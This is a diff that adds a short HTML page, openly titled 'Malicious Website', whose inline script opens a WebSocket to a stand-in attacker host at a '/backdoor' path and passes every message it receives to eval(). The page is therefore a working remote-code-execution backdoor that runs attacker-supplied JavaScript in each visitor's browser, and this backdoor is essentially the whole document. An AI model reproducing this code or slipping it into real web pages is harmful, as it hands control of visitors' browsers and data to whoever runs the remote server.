@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Malicious Website</title>
+</head>
+<body>
+  <h1>Welcome to the Malicious Website</h1>
+  <script>
+    // Malicious JavaScript code
+    var backdoor = new WebSocket("wss://your-malicious-website.com/backdoor");
+    backdoor.onopen = function() {
+      backdoor.send("Connected to backdoor");
+    };
+    backdoor.onmessage = function(event) {
+      eval(event.data);
+    };
+  </script>
+</body>
+</html>
